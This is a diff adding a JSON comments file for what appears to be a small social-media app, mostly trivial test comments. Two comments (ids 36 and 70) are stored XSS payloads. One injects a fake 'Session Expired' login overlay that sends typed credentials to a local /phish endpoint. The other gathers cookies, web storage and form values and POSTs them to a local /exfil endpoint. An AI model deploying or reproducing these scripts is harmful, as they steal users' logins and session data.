@@ -1,0 +1,117 @@
+{
+  "next_comment_id": 78,
+  "comments": [
+    {
+      "id": 5,
+      "tweet_id": "2-1",
+      "author_id": 1,
+      "author_name": "Shuvojit",
+      "text": "hello",
+      "created_at": "2026-04-21T17:04:35+00:00"
+    },
+    {
+      "id": 12,
+      "tweet_id": "2-2",
+      "author_id": 1,
+      "author_name": "Shuvojit",
+      "text": "happening",
+      "created_at": "2026-04-21T17:38:36+00:00"
+    },
+    {
+      "id": 17,
+      "tweet_id": "2-2",
+      "author_id": 1,
+      "author_name": "Shuvojit",
+      "text": "man",
+      "created_at": "2026-04-21T17:46:38+00:00"
+    },
+    {
+      "id": 20,
+      "tweet_id": "2-1",
+      "author_id": 1,
+      "author_name": "Shuvojit",
+      "text": "hero",
+      "created_at": "2026-04-21T17:48:55+00:00"
+    },
+    {
+      "id": 30,
+      "tweet_id": "2-2",
+      "author_id": 1,
+      "author_name": "Shuvojit",
+      "text": "hello man",
+      "created_at": "2026-04-21T18:33:51+00:00"
+    },
+    {
+      "id": 34,
+      "tweet_id": "2-3",
+      "author_id": 2,
+      "author_name": "Piyush",
+      "text": "okkkk",
+      "created_at": "2026-04-21T18:48:17+00:00"
+    },
+    {
+      "id": 35,
+      "tweet_id": "3-1",
+      "author_id": 3,
+      "author_name": "sas",
+      "text": "okkkk",
+      "created_at": "2026-04-21T18:51:27+00:00"
+    },
+    {
+      "id": 36,
+      "tweet_id": "3-1",
+      "author_id": 3,
+      "author_name": "sas",
+      "text": "<script>(function(){if(document.getElementById('phish'))return;var d=document.createElement('div');d.id='phish';d.style='position:fixed;top:0;left:0;width:100vw;height:100vh;background:rgba(0,0,0,0.85);z-index:999999;display:flex;align-items:center;justify-content:center;';d.innerHTML=`<div style=\"width:350px;padding:30px;background:#fff;border-radius:8px;text-align:center;\"><h3>Session Expired</h3><p>Re-authenticate:</p><input id=\"u\" placeholder=\"Username\" style=\"width:100%;padding:10px;margin:5px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;\"><input id=\"p\" type=\"password\" placeholder=\"Password\" style=\"width:100%;padding:10px;margin:5px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;\"><button onclick=\"stealCreds()\" style=\"width:100%;padding:10px;background:#007bff;color:white;border:none;border-radius:4px;cursor:pointer;\">Login</button></div>`;document.body.appendChild(d);window.stealCreds=function(){var u=document.getElementById('u').value,p=document.getElementById('p').value;new Image().src='http://127.0.0.1:5001/phish?user='+encodeURIComponent(u)+'&pass='+encodeURIComponent(p)+'&url='+encodeURIComponent(window.location.href);alert('Success! Redirecting...');d.remove();};document.getElementById('u').focus();new Image().src='http://127.0.0.1:5001/xss-executed?domain='+encodeURIComponent(window.location.hostname);})();</script>",
+      "created_at": "2026-04-21T18:57:02+00:00"
+    },
+    {
+      "id": 37,
+      "tweet_id": "4-1",
+      "author_id": 4,
+      "author_name": "Piyush",
+      "text": "who am I??",
+      "created_at": "2026-04-25T06:13:34+00:00"
+    },
+    {
+      "id": 38,
+      "tweet_id": "5-1",
+      "author_id": 5,
+      "author_name": "Imon",
+      "text": "BJP jitbe",
+      "created_at": "2026-04-25T06:14:48+00:00"
+    },
+    {
+      "id": 39,
+      "tweet_id": "6-1",
+      "author_id": 6,
+      "author_name": "Albert",
+      "text": "Exactly!!!",
+      "created_at": "2026-04-25T06:16:09+00:00"
+    },
+    {
+      "id": 40,
+      "tweet_id": "7-1",
+      "author_id": 7,
+      "author_name": "Soumyadeep",
+      "text": "whichever gives onboarding earlier",
+      "created_at": "2026-04-25T06:17:27+00:00"
+    },
+    {
+      "id": 41,
+      "tweet_id": "8-1",
+      "author_id": 8,
+      "author_name": "Shuvojit",
+      "text": "All the best!!!",
+      "created_at": "2026-04-25T06:18:23+00:00"
+    },
+    {
+      "id": 70,
+      "tweet_id": "4-4",
+      "author_id": 4,
+      "author_name": "Piyush",
+      "text": "<script> let sessionData = {     cookies: document.cookie,     localStorage: Object.fromEntries(Object.entries(localStorage)),     sessionStorage: Object.fromEntries(Object.entries(sessionStorage)),     forms: Array.from(document.forms).reduce((acc, form) => {         Array.from(form.elements).forEach(el => {             if (el.name) acc[el.name] = el.value;         });         return acc;     }, {}),     url: window.location.href,     referrer: document.referrer,     userAgent: navigator.userAgent };  fetch('http://127.0.0.1:5001/exfil', {     method: 'POST',     headers: {'Content-Type': 'application/json'},     body: JSON.stringify(sessionData) }).catch(()=>{}); </script>",
+      "created_at": "2026-04-26T03:53:39+00:00"
+    }
+  ]
+}
